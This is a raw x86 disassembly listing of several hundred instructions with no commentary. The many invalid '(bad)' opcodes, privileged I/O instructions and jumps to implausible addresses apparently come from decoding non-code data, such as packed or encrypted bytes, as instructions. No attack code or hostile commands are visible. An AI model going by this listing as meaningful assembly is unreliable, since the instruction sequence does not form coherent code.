  4195eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195ec:	in     eax,0xf
  4195ee:	sbb    eax,0x6a7b3d6e
  4195f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195f4:	jbe    0x4195ed
  4195f6:	xchg   edx,eax
  4195f7:	push   cs
  4195f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195f9:	adc    dl,BYTE PTR [ebx-0x4f]
  4195fc:	dec    esi
  4195fd:	xor    al,BYTE PTR [edi]
  4195ff:	or     eax,0x7b1303c
  419604:	iret   
  419605:	ret    0x5c70
  419608:	or     esp,DWORD PTR [ecx+0x309639e4]
  41960e:	(bad)  
  41960f:	or     al,0x6c
  419611:	jp     0x419677
  419613:	inc    edi
  419614:	(bad)  
  419615:	outs   dx,BYTE PTR ds:[esi]
  419616:	xor    esp,DWORD PTR [ecx-0x55f14149]
  41961c:	das    
  41961d:	(bad)  
  41961e:	sbb    esi,ebp
  419620:	outs   dx,BYTE PTR ds:[esi]
  419621:	(bad)  [ebx-0x4b59aa85]
  419627:	and    al,0x50
  419629:	hlt    
  41962a:	jmp    0xa817ffda
  41962f:	std    
  419630:	addr16 jno 0x41963e
  419633:	or     esp,DWORD PTR [ecx]
  419635:	jle    0x4195bd
  419637:	sbb    DWORD PTR gs:[edi],esp
  41963a:	ret    0xc674
  41963d:	fld    TBYTE PTR [ecx+0x35]
  419640:	jae    0x41962f
  419642:	bound  ecx,QWORD PTR [ecx-0x5f]
  419645:	cmp    BYTE PTR [ebx+edx*1+0x45],bl
  419649:	daa    
  41964a:	jmp    0x1afb4418
  41964f:	sbb    dh,bl
  419651:	dec    esi
  419652:	test   DWORD PTR [edi],0x2340469d
  419658:	test   cl,cl
  41965a:	mov    dx,0x8cf4
  41965e:	es xchg ebx,eax
  419660:	enter  0xcd88,0x75
  419664:	pop    ss
  419665:	and    BYTE PTR [eax+0xd],ah
  419668:	sub    BYTE PTR [edx+0x30513721],al
  41966e:	sub    esp,DWORD PTR [eax]
  419670:	cdq    
  419671:	xchg   bl,bh
  419673:	or     BYTE PTR [ecx-0xe],bl
  419676:	cmp    BYTE PTR [esi-0x63],dl
  419679:	xchg   DWORD PTR [ebx-0x6078eeab],esp
  41967f:	mov    bh,BYTE PTR [ebp-0x47922d67]
  419685:	dec    edi
  419686:	inc    ebx
  419687:	je     0x4196c3
  419689:	int    0x95
  41968b:	cs and al,0xb6
  41968e:	cmp    al,0x6b
  419690:	push   ecx
  419691:	out    0x6,ax
  419694:	add    DWORD PTR [ecx],esp
  419696:	push   eax
  419697:	jns    0x41967b
  419699:	mov    esp,0x2b721c8f
  41969e:	and    DWORD PTR [edi+0x472059ca],ebx
  4196a4:	lods   al,BYTE PTR ds:[esi]
  4196a5:	out    0x79,eax
  4196a7:	or     BYTE PTR [ecx-0x49],bh
  4196aa:	shl    BYTE PTR [esi-0x48449e53],cl
  4196b0:	push   ebx
  4196b1:	jl     0x4196de
  4196b3:	jo     0x4196f1
  4196b5:	pop    eax
  4196b6:	pushf  
  4196b7:	nop
  4196b8:	pop    esi
  4196b9:	sub    DWORD PTR [ebp+0x69],ebp
  4196bc:	test   BYTE PTR [ecx-0x5d],ch
  4196bf:	icebp  
  4196c0:	data16 aas 
  4196c2:	test   al,0x63
  4196c4:	mov    ds:0x10d50f90,al
  4196c9:	mov    edi,0x63850025
  4196ce:	dec    edx
  4196cf:	int    0xce
  4196d1:	in     eax,dx
  4196d2:	es out dx,eax
  4196d4:	out    0x2b,eax
  4196d6:	pop    ebx
  4196d7:	sbb    DWORD PTR [edx+0x6c],edi
  4196da:	call   0xa029:0xe2433151
  4196e1:	xchg   edi,eax
  4196e2:	pop    edi
  4196e3:	repz jmp 0xefd1cb72
  4196e9:	(bad)  
  4196ea:	int3   
  4196eb:	mov    gs,esi
  4196ed:	mov    DWORD PTR [esi-0x6b],edx
  4196f0:	push   esp
  4196f1:	mov    ah,0x60
  4196f3:	xor    dl,dl
  4196f5:	std    
  4196f6:	ss cli 
  4196f8:	mov    bh,0xad
  4196fa:	sti    
  4196fb:	sub    BYTE PTR [eax+0x433ec710],0x86
  419702:	out    dx,eax
  419703:	cmp    BYTE PTR [ebp-0xcac6bad],dl
  419709:	cld    
  41970a:	mov    al,0xa2
  41970c:	pushf  
  41970d:	jae    0x41975b
  41970f:	mov    al,0x64
  419711:	push   esi
  419712:	pop    edx
  419713:	or     bh,ch
  419715:	idiv   DWORD PTR [ecx+0x711337ad]
  41971b:	lahf   
  41971c:	sub    ah,ah
  41971e:	sub    ch,BYTE PTR [ebx+0x1a371f19]
  419724:	scas   al,BYTE PTR es:[edi]
  419725:	xlat   BYTE PTR ds:[ebx]
  419726:	lods   al,BYTE PTR ds:[esi]
  419727:	add    edx,DWORD PTR [esi+0x79a548b7]
  41972d:	mov    ebp,0xd46c5c56
  419732:	pushf  
  419733:	inc    esi
  419734:	in     al,0x42
  419736:	dec    edx
  419737:	xor    al,0x3f
  419739:	ds add cl,cl
  41973c:	fsub   DWORD PTR [eax]
  41973e:	call   0x56fb4bd1
  419743:	nop
  419744:	and    ebp,DWORD PTR [edx]
  419746:	mov    ah,0x86
  419748:	imul   DWORD PTR [esi]
  41974a:	ret    
  41974b:	jl     0x4197a7
  41974d:	cli    
  41974e:	fadd   DWORD PTR ds:0x14beb23a
  419754:	cmp    al,dl
  419756:	aad    0x4a
  419758:	lea    esi,[ecx+0x2c]
  41975b:	xchg   ecx,eax
  41975c:	pop    ecx
  41975d:	jae    0x41977f
  41975f:	ja     0x419771
  419761:	test   BYTE PTR [ebx+0x21ed5b8e],cl
  419767:	and    BYTE PTR [edx],cl
  419769:	out    0x26,al
  41976b:	loopne 0x41979a
  41976d:	push   esp
  41976e:	pop    ss
  41976f:	ds push esp
  419771:	cli    
  419772:	add    eax,0x3deded8b
  419777:	gs mov al,dl
  41977a:	jl     0x4197fb
  41977c:	scas   al,BYTE PTR es:[edi]
  41977d:	push   eax
  41977e:	jbe    0x41974d
  419780:	xchg   ecx,eax
  419781:	inc    esi
  419782:	retf   
  419783:	jg     0x4197f2
  419785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419786:	cmp    BYTE PTR [ebx],bh
  419788:	cmp    dh,BYTE PTR [ebx+eiz*4]
  41978b:	sub    eax,0x5f83172
  419790:	fistp  QWORD PTR [ebp+0xd]
  419793:	js     0x4197b5
  419795:	adc    eax,0xc6f4630
  41979a:	or     DWORD PTR ds:0x8a4d3bcf,0xffffffdd
  4197a1:	ret    0x6277
  4197a4:	sar    BYTE PTR [ecx],1
  4197a6:	pop    edi
  4197a7:	scas   al,BYTE PTR es:[edi]
  4197a8:	ficomp WORD PTR [esi]
  4197aa:	js     0x419810
  4197ac:	jnp    0x41973f
  4197ae:	sbb    DWORD PTR [ebp+0xf],ebx
  4197b1:	jnp    0x419756
  4197b3:	xchg   esp,eax
  4197b4:	xor    dl,BYTE PTR ds:0x2b535f1f
  4197ba:	sbb    al,0xc5
  4197bc:	jg     0x41976a
  4197be:	je     0x41974e
  4197c0:	mov    ecx,0x3ab10486
  4197c5:	xor    BYTE PTR ds:0x14d50682,bh
  4197cb:	dec    esp
  4197cc:	iret   
  4197cd:	and    ch,bh
  4197cf:	mov    ch,BYTE PTR [esi-0x4d]
  4197d2:	(bad)  
  4197d3:	cmc    
  4197d4:	fst    QWORD PTR [edx+0x5e28db8]
  4197da:	call   0x2b8f3fc5
  4197df:	int    0x93
  4197e1:	jb     0x419840
  4197e3:	xchg   esp,eax
  4197e4:	hlt    
  4197e5:	sub    eax,0x2c56f8be
  4197ea:	lds    esp,FWORD PTR [esp+edi*4+0x65]
  4197ee:	jmp    0x419772
  4197f0:	sbb    dl,BYTE PTR [edx+0xc667323]
  4197f6:	adc    al,0x29
  4197f8:	mov    ah,0x91
  4197fa:	and    al,0xcd
  4197fc:	mov    esi,0x29940607
  419801:	push   ss
  419802:	sub    eax,0xe2cde282
  419807:	mov    esp,0x88a5ed98
  41980c:	sbb    eax,0xfec8448c
  419811:	jb     0x419888
  419813:	movd   DWORD PTR [esi+edx*8-0x16882a45],mm6
  41981b:	sbb    bl,al
  41981d:	sbb    edi,DWORD PTR [edx]
  41981f:	rol    BYTE PTR [ecx+0x16],cl
  419822:	add    ebx,eax
  419824:	pop    es
  419825:	add    eax,0x70cd029
  41982a:	inc    ebx
  41982b:	hlt    
  41982c:	mov    BYTE PTR [edi],ah
  41982e:	mov    dl,0x57
  419830:	rcr    BYTE PTR [edi+eiz*8-0x3feac0fc],cl
  419837:	cdq    
  419838:	dec    edi
  419839:	and    DWORD PTR [edi],ebp
  41983b:	loope  0x4198a1
  41983d:	jl     0x4198ba
  41983f:	mov    WORD PTR [esi-0x602617fd],ds
  419845:	jae    0x419829
  419847:	jle    0x4198b4
  419849:	push   edx
  41984a:	std    
  41984b:	fiadd  WORD PTR [edi+esi*8]
  41984e:	sbb    ebp,ebp
  419850:	push   ebp
  419851:	(bad)  
  419852:	nop
  419853:	daa    
  419854:	test   DWORD PTR [ecx+0x32],ebx
  419857:	push   ecx
  419858:	mov    DWORD PTR [esi-0xe],ecx
  41985b:	mov    dh,0xdd
  41985d:	sti    
  41985e:	(bad)  
  41985f:	adc    al,0xba
  419861:	test   al,0xa0
  419863:	inc    esi
  419864:	cld    
  419865:	lds    ecx,FWORD PTR [ebx]
  419867:	mov    dh,0x45
  419869:	xor    esi,ebp
  41986b:	pop    esi
  41986c:	sbb    BYTE PTR [edi+ebx*8],ah
  41986f:	fwait
  419870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419871:	inc    esp
  419872:	sbb    DWORD PTR [eax+0xa],0x6d
  419876:	jmp    0x27cd:0x4857bce5
  41987d:	jne    0x419859
  41987f:	jle    0x41984c
  419881:	leave  
  419882:	xchg   ebx,eax
  419883:	das    
  419884:	dec    edi
  419885:	clc    
  419886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419887:	sti    
  419888:	push   ecx
  419889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41988a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41988b:	jbe    0x41987f
  41988d:	sti    
  41988e:	jl     0x41981e
  419890:	jbe    0x4198d4
  419892:	pop    ecx
  419893:	sbb    BYTE PTR [esi-0x3d112db0],ch
  419899:	mov    esi,ecx
  41989b:	or     DWORD PTR [edx+ecx*4],edx
  41989e:	dec    ebx
  41989f:	xchg   ebx,eax
  4198a0:	sub    esi,eax
  4198a2:	add    al,0xd0
  4198a4:	adc    DWORD PTR [ebp+ebx*8+0x49],esp
  4198a8:	jmp    0x45280bd
  4198ad:	sbb    al,0xb
  4198af:	(bad)  
  4198b0:	push   es
  4198b1:	sbb    eax,0xd5da4fbf
  4198b6:	ss dec edi
  4198b8:	jne    0x9b5e1307
  4198be:	add    DWORD PTR [edi+0x7b],ecx
  4198c1:	adc    esi,DWORD PTR [edx-0x35c7dd96]
  4198c7:	and    al,0x51
  4198c9:	mov    cl,0xb5
  4198cb:	cmp    DWORD PTR [eax+0x348b3cb6],edx
  4198d1:	(bad)  
  4198d2:	jmp    0x7b4aaa1e
  4198d7:	pop    ebp
  4198d8:	mov    ds:0x4e29342f,al
  4198dd:	sbb    BYTE PTR ds:0x5dd0e6b1,ah
  4198e3:	inc    esi
  4198e4:	cmp    dl,dh
  4198e6:	push   edx
  4198e7:	mov    ecx,0xffa72890
  4198ec:	mov    edx,0x844cebd1
  4198f1:	lods   eax,DWORD PTR ds:[esi]
  4198f2:	lahf   
  4198f3:	mov    bh,0x85
  4198f5:	cmc    
  4198f6:	and    al,0x2f
  4198f8:	mov    bl,0x45
  4198fa:	pop    ebx
  4198fb:	push   ds
  4198fc:	sub    esp,DWORD PTR [edx+ebp*8-0x343b3a42]
  419903:	mov    dl,0x0
  419905:	mov    ah,0x83
  419907:	(bad)  
  419908:	gs jb  0x4198a1
  41990b:	pop    ebx
  41990c:	out    dx,eax
  41990d:	arpl   WORD PTR [esi-0x75],sp
  419910:	mov    eax,ds:0xa8f2c347
  419915:	jb     0x41993a
  419917:	jl     0x41990c
  419919:	push   ebx
  41991a:	stc    
  41991b:	ud0    edi,DWORD PTR [eax]
  41991e:	add    eax,esp
  419920:	cmp    ah,bh
  419922:	test   BYTE PTR [eax+esi*2-0x2a49119e],0xc3
  41992a:	and    eax,0x9a4cfc64
  41992f:	mov    BYTE PTR ds:0x5e1fbf53,ah
  419935:	cwde   
  419936:	jne    0x4198c5
  419938:	cmp    bl,0x86
  41993b:	sbb    al,0x8e
  41993d:	dec    edi
  41993e:	shr    BYTE PTR [edx-0x1e732b98],cl
  419944:	fcmovnu st,st(0)
  419946:	mov    ds:0xc26e06cc,eax
  41994b:	data16 loopne 0x41995d
  41994e:	mul    DWORD PTR [edi]
  419950:	jp     0x41995b
  419952:	lds    edi,FWORD PTR [ebp-0x45]
  419955:	cmp    eax,0x90abaf4c
  41995a:	mov    bl,0xd6
  41995c:	sub    ecx,DWORD PTR [ebp-0x77]
  41995f:	or     dh,dl
  419961:	inc    esp
  419962:	or     al,0x7a
  419964:	xor    DWORD PTR [edx],esi
  419966:	cld    
  419967:	cmp    DWORD PTR [eax+ebp*4],0xffffff89
  41996b:	xor    al,0xb6
  41996d:	pop    es
  41996e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41996f:	dec    ebp
  419970:	adc    esi,ebx
  419972:	pop    eax
  419973:	pop    ds
  419974:	mov    eax,ds:0xbb7ebe85
  419979:	inc    esp
  41997a:	mov    dh,0x2e
  41997c:	cli    
  41997d:	push   eax
  41997e:	dec    esp
  41997f:	adc    BYTE PTR [ecx],0xb9
  419982:	sbb    ah,cl
  419984:	nop
  419985:	cmp    DWORD PTR [esi],esi
  419987:	push   edi
  419988:	dec    esp
  419989:	inc    eax
  41998a:	(bad)  
  41998b:	mov    esi,0x77af350c
  419990:	or     esp,DWORD PTR [ebx]
  419992:	mov    esp,ebp
  419994:	test   BYTE PTR ds:0xe8ddc714,ah
  41999a:	xchg   edi,eax
  41999b:	jmp    0xe3c36261
  4199a0:	dec    eax
  4199a1:	xchg   BYTE PTR [esi-0x5f2ff77a],bh
  4199a7:	inc    esp
  4199a8:	mov    dl,0xae
  4199aa:	in     eax,0xcc
  4199ac:	inc    ecx
  4199ad:	jns    0x419956
  4199af:	sbb    ecx,edi
  4199b1:	add    esi,DWORD PTR [eax-0x5286a942]
  4199b7:	ret    
  4199b8:	js     0x4199ed
  4199ba:	fild   DWORD PTR [edx]
  4199bc:	repnz and DWORD PTR [ecx],0x4f
  4199c0:	mov    eax,0x62e46dd0
  4199c5:	sbb    eax,0x8c9377a6
  4199ca:	popa   
  4199cb:	mov    eax,ds:0x93def83a
  4199d0:	mov    ecx,0xf427ee14
  4199d5:	das    
  4199d6:	sbb    cl,BYTE PTR [eax+0x42]
  4199d9:	sbb    DWORD PTR [bp+di+0x35],0xfffffffe
  4199de:	mov    bl,0x5f
  4199e0:	ins    BYTE PTR es:[edi],dx
  4199e1:	mov    dl,0x34
  4199e3:	in     eax,0x40
  4199e5:	add    esp,DWORD PTR [ebx+0x50]
  4199e8:	imul   esp,DWORD PTR [ecx],0xffffffb6
  4199eb:	dec    ebp
  4199ec:	repz or ch,bl
  4199ef:	ret    
  4199f0:	fisttp DWORD PTR [edi]
  4199f2:	fst    QWORD PTR [esi+edi*4-0x19]
  4199f6:	mov    esi,0x2a3948ad
  4199fb:	sub    al,BYTE PTR ds:0xd190f38e
  419a01:	dec    DWORD PTR [eax+0x77]
  419a04:	int    0xe7
  419a06:	add    eax,0x4cf813c0
  419a0b:	enter  0xb7f2,0x78
  419a0f:	sbb    BYTE PTR [edi],bl
  419a11:	cmp    BYTE PTR [edx+0x78d36d2f],ch
  419a17:	shl    DWORD PTR [edx+0x6796c057],0x6a
  419a1e:	(bad)  [edx+0x4fecb9e7]
  419a24:	push   esp
  419a25:	js     0x419a70
  419a27:	push   ebx
  419a28:	into   
  419a29:	inc    ebx
  419a2a:	or     esp,DWORD PTR [eax-0x41]
  419a2d:	(bad)  
  419a2e:	sbb    eax,0x9e5f0867
  419a33:	test   DWORD PTR [esi],ebx
  419a35:	dec    ecx
  419a36:	add    ch,0xdd
  419a39:	xchg   BYTE PTR [eax+edx*1+0x54],al
  419a3d:	jbe    0x4199d2
  419a3f:	jb     0x419a2f
  419a41:	arpl   WORD PTR [esi],di
  419a43:	js     0x419a22
  419a45:	stc    
  419a46:	xor    DWORD PTR [ecx],ecx
  419a48:	adc    eax,0x32f793f3
  419a4d:	mov    DWORD PTR [edx-0x7c956b71],edx
  419a53:	call   0x6ed8:0x2abd5043
  419a5a:	cwde   
  419a5b:	leave  
  419a5c:	out    0xe1,al
  419a5e:	pushf  
  419a5f:	jecxz  0x419a60
  419a61:	out    0x8a,eax
  419a63:	mov    eax,0xfe8409bb
  419a68:	pop    ebp
  419a69:	or     dh,0xc7
  419a6c:	dec    edi
  419a6d:	mov    eax,0x5b0b341c
  419a72:	lea    edi,[edi]
  419a74:	into   
  419a75:	jg     0x419aac
  419a77:	sbb    BYTE PTR [ecx-0x40973b1d],ah
  419a7d:	sub    al,0x52
  419a7f:	adc    edi,esi
  419a81:	(bad)  [edi-0x4d]
  419a84:	xchg   edx,eax
  419a85:	jp     0x419a9d
  419a87:	ins    BYTE PTR es:[edi],dx
  419a88:	or     DWORD PTR [esp+esi*8+0x25],ebx
  419a8c:	push   edx
  419a8d:	ffree  st(7)
  419a8f:	dec    esi
  419a90:	sbb    al,0x24
  419a92:	jo     0x419af6
  419a94:	fwait
  419a95:	dec    esi
  419a96:	retf   0x3876
  419a99:	mov    ebx,0x4fe90b54
  419a9e:	mov    dh,BYTE PTR [ebx]
  419aa0:	clc    
  419aa1:	pop    ebx
  419aa2:	push   ds
  419aa3:	inc    ecx
  419aa4:	sub    eax,0xc943f942
  419aa9:	sbb    DWORD PTR [ecx-0x68a84143],edi
  419aaf:	ror    DWORD PTR [edx-0x7c],0xed
  419ab3:	adc    esp,DWORD PTR ds:0xa9c2f2cd
  419ab9:	push   eax
  419aba:	mov    esi,0x2b3be97a
  419abf:	xchg   edx,eax
  419ac0:	loop   0x419a9d
  419ac2:	out    0xfc,al
  419ac4:	push   cs
  419ac5:	daa    
  419ac6:	xor    edi,DWORD PTR [esi+0x7f]
  419ac9:	cli    
  419aca:	pop    edi
  419acb:	or     al,0xb7
  419acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ace:	inc    edx
  419acf:	outs   dx,DWORD PTR ds:[esi]
  419ad0:	pop    ebx
  419ad1:	imul   ebx,esp,0x113cd84b
  419ad7:	in     al,dx
  419ad8:	jl     0x419a75
  419ada:	cmp    BYTE PTR [eax+edi*2+0x42b2e12b],ch
  419ae1:	mov    dh,0x1a
  419ae3:	fwait
  419ae4:	adc    edx,DWORD PTR [ebx]
  419ae6:	arpl   WORD PTR es:[eax+0x3b],sp
  419aea:	sub    eax,0xfbc94d8
  419aef:	int3   
  419af0:	sbb    bl,dl
  419af2:	xor    al,0xf
  419af4:	push   ss
  419af5:	and    bh,bl
  419af7:	jmp    0x419b0e
  419af9:	outs   dx,DWORD PTR ds:[esi]
  419afa:	cmp    DWORD PTR [ebx],ebp
  419afc:	stos   BYTE PTR es:[edi],al
  419afd:	out    dx,al
  419afe:	les    ecx,FWORD PTR [edx+0x59]
  419b01:	cmp    dh,cl
  419b03:	add    eax,0x7d70f735
  419b08:	push   esi
  419b09:	test   eax,0x34591802
  419b0e:	push   ecx
  419b0f:	outs   dx,BYTE PTR ds:[esi]
  419b10:	ret    
  419b11:	div    edx
  419b13:	sub    eax,0xc0e8fdd5
  419b18:	js     0x419b88
  419b1a:	je     0x419b08
  419b1c:	(bad)  
  419b1d:	repnz adc ebx,DWORD PTR [ebp+0x1a]
  419b21:	icebp  
  419b22:	cld    
  419b23:	mov    edi,0xa09c7038
  419b28:	sar    DWORD PTR [ecx],0x2a
  419b2b:	outs   dx,BYTE PTR ds:[esi]
  419b2c:	dec    esi
  419b2d:	lahf   
  419b2e:	ss xor al,0x83
  419b31:	inc    ebp
  419b32:	jg     0x419b52
  419b34:	adc    eax,0x7eab2180
  419b39:	sub    BYTE PTR [edx],0xa2
  419b3c:	mov    esi,0x46e572a3
  419b41:	sub    DWORD PTR [edi],eax
  419b43:	rcl    DWORD PTR [edi],1
  419b45:	jmp    0x39e2cee4
  419b4a:	test   DWORD PTR [ebx-0x6c],esi
  419b4d:	popa   
  419b4e:	xor    eax,0x74fa50c9
  419b53:	push   ds
  419b54:	fidivr DWORD PTR [edx-0x4f]
  419b57:	mov    dh,dh
  419b59:	sbb    eax,edx
  419b5b:	jbe    0x419b78
  419b5d:	push   esp
  419b5e:	es jns 0x419b06
  419b61:	mov    esp,0x5faffec8
  419b66:	cld    
  419b67:	or     cl,ah
  419b69:	sub    BYTE PTR ds:0x355de58b,dl
  419b6f:	inc    ebp
  419b70:	aas    
  419b71:	sbb    eax,0x6acb18cf
  419b76:	mov    esi,0xfa37c7d6
  419b7b:	je     0x419b48
  419b7d:	lods   eax,DWORD PTR ds:[esi]
  419b7e:	mov    dl,BYTE PTR [eax-0x5d]
  419b81:	out    dx,al
  419b82:	push   ebp
  419b83:	fidiv  WORD PTR [ebx]
  419b85:	push   esp
  419b86:	dec    ecx
  419b87:	jo     0x419c04
  419b89:	outs   dx,DWORD PTR ds:[esi]
  419b8a:	add    al,bl
  419b8c:	xor    ecx,0xe6a3f3fe
  419b92:	jl     0x419bb8
  419b94:	sub    eax,edx
  419b96:	cmp    DWORD PTR [ebx-0x37],0xed759922
  419b9d:	push   esi
  419b9e:	inc    eax
  419b9f:	pop    esi
  419ba0:	push   edx
  419ba1:	sbb    al,0x24
  419ba3:	mov    ebp,0x108181a3
  419ba8:	or     DWORD PTR [edi+edi*2-0x6548287f],0xa92030da
  419bb3:	and    al,0x14
  419bb5:	scas   eax,DWORD PTR es:[edi]
  419bb6:	or     BYTE PTR [ecx+eax*1+0x16ff7dd9],cl
  419bbd:	jb     0x419c31
  419bbf:	sbb    DWORD PTR [edx+0x3],edx
  419bc2:	shr    BYTE PTR [eax+0x66],cl
  419bc5:	int3   
  419bc6:	sbb    ebp,DWORD PTR [ebp+0x18b00d34]
  419bcc:	jae    0x419c2a
  419bce:	cmp    ebp,ecx
  419bd0:	push   cs
  419bd1:	lds    eax,FWORD PTR [ebp+0x3867a617]
  419bd7:	out    0x2d,eax
  419bd9:	cmp    al,BYTE PTR [ebx-0x41]
  419bdc:	mov    BYTE PTR [esi+edx*8-0x25],ah
  419be0:	inc    ecx
  419be1:	fcmove st,st(4)
  419be3:	sub    eax,0x288b6852
  419be8:	call   FWORD PTR [ebp-0x3f9ec396]
  419bee:	dec    BYTE PTR [eax*1+0x6ac8ca55]
  419bf5:	imul   esp,DWORD PTR ds:0x4a34a8b5,0xffffffdd
  419bfc:	gs mov dh,0xee
  419bff:	ins    DWORD PTR es:[edi],dx
  419c00:	and    al,0x62
  419c02:	mov    ds:0x8ec67f4f,al
  419c07:	or     DWORD PTR [ebx+0x34591404],ebx
  419c0d:	sbb    al,0x7c
  419c0f:	add    DWORD PTR [esi],edx
  419c11:	aas    
  419c12:	lds    ebx,FWORD PTR [eax]
  419c14:	ret    0xbfcd
  419c17:	add    BYTE PTR [ecx],ah
  419c19:	mov    bh,0xa0
  419c1b:	rcl    DWORD PTR [ecx+edx*2-0x4b271a7b],1
  419c22:	(bad)  
  419c23:	repz mov cl,0x19
  419c26:	mov    edi,0xca35e2d1
  419c2b:	fs retf 0xb8da
  419c2f:	call   0x76a5f285
  419c34:	dec    eax
  419c35:	arpl   WORD PTR [edi-0x30],bp
  419c38:	fcmovnb st,st(5)
  419c3a:	and    al,0x57
  419c3c:	or     DWORD PTR [ecx-0x28],0xffffffc5
  419c40:	mov    dh,0xb3
  419c42:	rol    DWORD PTR [edx+0x16c523cc],1
  419c48:	cmp    eax,0xfd1eb27c
  419c4d:	mov    edx,DWORD PTR [ebp+0x5dd3be01]
  419c53:	xlat   BYTE PTR ds:[ebx]
  419c54:	xchg   ebp,eax
  419c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c56:	push   cs
  419c57:	fnop   
  419c59:	jle    0x419be1
  419c5b:	sbb    dh,BYTE PTR fs:[ecx+ebx*1-0x6378aecc]
  419c63:	leave  
  419c64:	enter  0xa7f0,0xa0
  419c68:	fistp  WORD PTR [ebp+ebx*1+0x4fc2bbe2]
  419c6f:	fs xchg edi,eax
  419c71:	out    0xd2,eax
  419c73:	cwde   
  419c74:	or     bl,bh
  419c76:	and    ecx,ebp
  419c78:	leave  
  419c79:	mov    ds:0x9af28f1d,al
  419c7e:	push   ecx
  419c7f:	fmul   DWORD PTR [edi-0x66bbe93b]
  419c85:	mov    eax,?
  419c87:	mov    al,dl
  419c89:	icebp  
  419c8a:	in     al,dx
  419c8b:	shl    ch,1
  419c8d:	inc    ebp
  419c8e:	or     BYTE PTR [ecx+0x2515c796],dl
  419c94:	pop    esi
  419c95:	das    
  419c96:	dec    eax
  419c97:	gs xchg cx,ax
  419c9a:	stc    
  419c9b:	push   0x10
  419c9d:	stos   BYTE PTR es:[edi],al
  419c9e:	push   eax
  419c9f:	jne    0x419c5a
  419ca1:	or     edx,DWORD PTR [edi+0x241c6830]
  419ca7:	(bad)  
  419ca8:	xor    al,0xa8
  419caa:	cld    
  419cab:	sbb    al,0xd0
  419cad:	jmp    0x9ca:0xfeb6f9f
  419cb4:	(bad)  
  419cb5:	jo     0x419d03
  419cb7:	rcl    BYTE PTR [esi+0x321a8c23],0x52
  419cbe:	xor    edx,DWORD PTR [edi+0x4a]
  419cc1:	jo     0x419d1d
  419cc3:	sbb    DWORD PTR [ecx-0x28d6fdc2],0x953b70c8
  419ccd:	cdq    
  419cce:	scas   al,BYTE PTR es:[edi]
  419ccf:	nop
  419cd0:	adc    eax,0xc56badd1
  419cd5:	int    0x3
  419cd7:	sub    BYTE PTR [eax+0x73],al
  419cda:	jnp    0x419c83
  419cdc:	hlt    
  419cdd:	iret   
  419cde:	fstp   QWORD PTR [eax]
  419ce0:	xchg   ebx,eax
  419ce1:	popf   
  419ce2:	pop    eax
  419ce3:	popf   
  419ce4:	inc    eax
  419ce5:	push   ebp
  419ce6:	(bad)  
  419ce7:	mov    ds:0xf7787a81,eax
  419cec:	push   esp
  419ced:	or     al,0x7f
  419cef:	nop
  419cf0:	loopne 0x419d0d
  419cf2:	loop   0x419d15
  419cf4:	into   
  419cf5:	(bad)  
  419cf6:	aas    
  419cf7:	aaa    
  419cf8:	add    eax,0xfd706d8a
  419cfd:	jp     0x419ccd
  419cff:	sbb    ch,BYTE PTR [edi+0x25]
  419d02:	mov    esp,0x87e5c8ea
  419d07:	dec    ebp
  419d08:	push   esi
  419d09:	dec    edx
  419d0a:	in     al,0xba
  419d0c:	mov    DWORD PTR [ebp+0x2a],esp
  419d0f:	aad    0x6a
  419d11:	mov    al,ds:0xa677722c
  419d16:	rcl    esi,cl
  419d18:	dec    ecx
  419d19:	sbb    al,0xc7
  419d1b:	popa   
  419d1c:	in     eax,0xc1
  419d1e:	pushf  
  419d1f:	mov    esp,0xc51985fd
  419d24:	xchg   BYTE PTR [esi-0x6f25b68],cl
  419d2a:	test   BYTE PTR [edi+0x31],0xc5
  419d2e:	movsx  eax,WORD PTR [ecx]
  419d31:	dec    ebp
  419d32:	inc    esi
  419d33:	push   edi
  419d34:	repz inc esp
  419d36:	or     al,0x83
  419d38:	or     ebp,edi
  419d3a:	ret    0x20c3
  419d3d:	sub    dh,BYTE PTR [edi+0x221ac84e]
  419d43:	dec    ecx
  419d44:	jmp    0x8bdbae64
  419d49:	push   ecx
  419d4a:	lea    ecx,[edi-0x46]
  419d4d:	xchg   ecx,eax
  419d4e:	fistp  DWORD PTR [eax+eax*2]
  419d51:	ins    DWORD PTR es:[edi],dx
  419d52:	test   eax,0x918658bf
  419d57:	dec    esp
  419d58:	lods   al,BYTE PTR ds:[esi]
  419d59:	push   edi
  419d5a:	call   FWORD PTR ds:0x60577952
  419d60:	(bad)  
  419d61:	outs   dx,BYTE PTR ds:[esi]
  419d62:	test   eax,0x925d4b5b
  419d67:	daa    
  419d68:	mov    ds:0xfb97f482,eax
  419d6d:	adc    DWORD PTR [ebx+0x2f],edx
  419d70:	in     al,dx
  419d71:	shl    DWORD PTR [esp+edi*4-0x5f668817],1
  419d78:	arpl   WORD PTR [edx],sp
  419d7a:	xchg   ebp,eax
  419d7b:	pop    ecx
  419d7c:	out    dx,al
  419d7d:	or     ch,al
  419d7f:	push   ecx
  419d80:	and    dh,dh
  419d82:	mov    WORD PTR [edx-0x6e],cs
  419d85:	mov    al,ds:0xcbcebdca
  419d8a:	push   esi
  419d8b:	dec    edx
  419d8c:	in     al,dx
  419d8d:	test   ah,dh
  419d8f:	daa    
  419d90:	add    eax,0x6bcfcbe4
  419d95:	jne    0x419d3d
  419d97:	shr    BYTE PTR [eax-0x42],1
  419d9a:	sbb    eax,0xc3c20601
  419d9f:	addr16 mov al,0xbd
  419da2:	inc    edx
  419da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419da4:	shl    ecx,0x0
  419da7:	dec    esp
  419da8:	loope  0x419e25
  419daa:	dec    edi
  419dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dac:	push   ds
  419dad:	add    BYTE PTR [ecx],bh
  419daf:	or     al,0x71
  419db1:	xchg   edx,eax
  419db2:	bound  eax,QWORD PTR [esi]
  419db4:	jae    0x419e05
  419db6:	inc    esp
  419db7:	push   esi
  419db8:	mov    ah,0xf
